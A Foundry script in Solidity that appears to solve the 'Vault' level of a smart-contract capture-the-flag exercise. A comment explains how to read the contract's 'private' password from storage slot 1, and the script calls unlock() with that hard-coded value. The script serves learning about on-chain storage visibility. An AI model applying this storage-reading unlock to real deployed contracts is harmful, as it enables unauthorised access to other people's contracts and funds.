// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Vault} from "../src/Lv-08/Vault.sol";

contract VaultScript is Script {
    function run() public {
        vm.startBroadcast();
        //REPLACE ADDRESS WITH YOUR OWN Vault INSTANCE ADDRESS
        Vault _vault = Vault(0xC9FCba751a5709589283898D0FE2b6f9bBF27179);

        //Use the browser console to get password using: await web3.eth.getStorageAt('Vault address as string', 1)
        _vault.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);
        vm.stopBroadcast();
    }
}
